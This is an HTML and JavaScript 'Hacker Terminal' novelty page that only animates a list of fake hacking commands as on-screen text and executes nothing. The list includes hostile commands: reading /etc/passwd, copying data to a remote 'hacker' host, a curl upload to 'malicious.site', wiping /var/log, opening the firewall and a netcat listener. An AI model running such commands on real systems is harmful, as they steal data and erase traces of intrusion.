<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hacker Terminal</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: rgb(30, 30, 30);
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .container {
            width: 100%;
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        header {
            width: 100%;
            color: rgb(164, 164, 164);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
            height: 12vh;
        }

        header .text {
            font-size: 1.5em;
        }

        .terminal {
            width: 80vw;
            height: calc(100vh - 12vh - 30px);
            border-radius: 17px;
            background-color: rgb(16, 16, 16);
            box-shadow: rgb(78, 78, 78) 10px 10px 20px;
            color: green;
            font-family: 'Courier New', Courier, monospace;
            font-size: 1rem;
            overflow-y: auto;
            margin-top: 10px;
            padding: 10px;
            
        }

        .terminal p {
            margin: 0;
            padding: 5px 0;
        }
    </style>
</head>

<body>
    <div class="container">
        <header>
            <div class="text">>_ H A C K E R</div>
        </header>
        <div class="terminal"></div>
    </div>
    <script>
        const messages = [
            "Initializing Hacking",
            "mkdir /tmp/hack && cd /tmp/hack",
            "echo 'import os; os.system(\"/bin/bash\")' > exploit.py",
            "python3 exploit.py",
            "cat /etc/passwd",
            "scp /tmp/hack.tar.gz hacker@remote:/hack_data",
            "rm -rf /tmp/hack",
            "iptables -A INPUT -j ACCEPT",
            "openssl enc -aes-256-cbc -salt -in data.txt -out encrypted.txt -k PASSWORD",
            "curl -X POST -d @data.json http://malicious.site/upload",
            "rm -rf /var/log/*",
            "shutdown -h now",
            "exit",
            "nmap -sP 192.168.1.0/24",
            "nc -lvp 4444"
        ];

        function getRandTime() {
            return (Math.ceil(1 + Math.random() * 6)) * 1000; // generates a random between [1000, 7000] milliseconds
        }

        function dot(element) {
            let dots = '';
            let interval = setInterval(() => {
                dots = dots.length < 3 ? dots + '.' : '';
                element.innerHTML = element.innerHTML.replace(/\.*$/, dots);
            }, 500);
            return interval;
        }

        async function start() {
            const terminal = document.querySelector(".terminal");
            for (const message of messages) {
                const p = document.createElement("p");
                p.innerHTML = `${message}`;
                terminal.appendChild(p);
                const interval = dot(p);
                await new Promise(resolve => setTimeout(resolve, getRandTime()));
                clearInterval(interval);
                p.innerHTML = `${message}...`;
                terminal.scrollTop = terminal.scrollHeight; // Auto-scroll
                terminal.style.scrollbarWidth =  "none";
            }
        }

        start();
    </script>
</body>

</html>
